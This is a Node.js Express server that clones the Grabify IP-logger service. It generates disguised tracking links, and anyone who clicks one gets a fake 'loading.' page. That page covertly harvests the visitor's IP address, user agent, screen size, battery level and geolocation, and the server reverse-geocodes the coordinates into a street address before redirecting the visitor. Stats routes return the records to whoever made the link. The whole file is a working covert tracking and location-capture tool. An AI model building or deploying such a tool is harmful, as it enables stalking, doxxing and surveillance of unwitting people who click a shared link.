const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

const app = express();

// Connect to MongoDB
mongoose.connect('mongodb://localhost/grabify-clone');

const db = mongoose.connection;
db.on('error', console.error.bind(console, 'connection error:'));
db.once('open', () => {
    console.log('Connected to MongoDB');
});

// Define a schema and model for tracking data
const trackingSchema = new mongoose.Schema({
    id: String,
    targetUrl: String,
    clicks: [{ 
        userAgent: String, 
        ip: String, 
        timestamp: Date, 
        latitude: Number, 
        longitude: Number, 
        batteryLevel: Number, 
        screenWidth: Number, 
        screenHeight: Number 
    }]
});

const Tracking = mongoose.model('Tracking', trackingSchema);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/generate', async (req, res) => {
    const id = uuidv4();
    const targetUrl = req.body.target_url;
    const newTracking = new Tracking({ id, targetUrl, clicks: [] });
    await newTracking.save();

    const trackingUrl = `${req.protocol}://${req.get('host')}/track/${id}`;
    res.json({ trackingUrl });
});

app.get('/track/:id', async (req, res) => {
    const { id } = req.params;
    const tracking = await Tracking.findOne({ id });

    if (tracking) {
        const deviceInfo = {
            userAgent: req.headers['user-agent'],
            ip: req.ip,
            timestamp: new Date(),
            latitude: null,
            longitude: null,
            batteryLevel: null,
            screenWidth: null,
            screenHeight: null
        };

        const script = `
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>loading.</title>
            </head>
            <body>
                <script>
                    // Function to send the collected data to the server
                    function sendDeviceInfo(battery, latitude, longitude) {
                        const deviceInfo = {
                            userAgent: navigator.userAgent,
                            screenWidth: window.screen.width,
                            screenHeight: window.screen.height,
                            batteryLevel: battery ? battery.level * 100 : null,
                            latitude: latitude,
                            longitude: longitude
                        };

                        fetch('/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                pageID: '${id}',
                                deviceInfo: deviceInfo
                            }),
                        })
                        .then(response => response.json())
                        .then(data => {
                            console.log('Device info sent:', data);
                            window.location.href = '${tracking.targetUrl}';
                        })
                        .catch(error => {
                            console.error('Error sending device info:', error);
                            window.location.href = '${tracking.targetUrl}';
                        });
                    }

                    // Get battery info
                    navigator.getBattery().then(battery => {
                        // Get location info
                        navigator.geolocation.getCurrentPosition(
                            position => {
                                sendDeviceInfo(battery, position.coords.latitude, position.coords.longitude);
                            },
                            error => {
                                console.error('Error getting location:', error);
                                sendDeviceInfo(battery, null, null);
                            }
                        );
                    }).catch(() => {
                        console.error('Error getting battery info');
                        sendDeviceInfo(null, null, null);
                    });
                </script>
            </body>
            </html>
        `;

        res.send(script);
    } else {
        res.status(404).send('Invalid tracking URL');
    }
});

app.post('/location', async (req, res) => {
    const { pageID, deviceInfo } = req.body;
    const tracking = await Tracking.findOne({ id: pageID });

    if (tracking) {
        tracking.clicks.push({ ...deviceInfo });
        await tracking.save();
        console.log(`Tracking details for page ${pageID}:`, tracking.clicks);
    }

                //latitude and longitude to address conversion

                const url = `https://nominatim.openstreetmap.org/reverse?lat=${deviceInfo.latitude}&lon=${deviceInfo.longitude}&format=json`;

                const response = await fetch(url);
                const data = await response.json();
        
                if (data && data.address) {
                    const address = data.display_name;
                    console.log('Address : ',address);
                } 

    res.status(200).send({ success: true });;

});


// GET route to retrieve tracking data
app.get('/get-tracking/:pageID', async (req, res) => {
    const { pageID } = req.params;
    const tracking = await Tracking.findOne({ id: pageID });

    if (tracking) {
        res.json({ clicks: tracking.clicks });
    } else {
        res.status(404).json({ message: 'Tracking data not found' });
    }
});



app.get('/stats/:id', async (req, res) => {
    const { id } = req.params;
    const tracking = await Tracking.findOne({ id });

    if (tracking) {
        res.json(tracking.clicks);
    } else {
        res.status(404).send('Invalid tracking ID');
    }
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
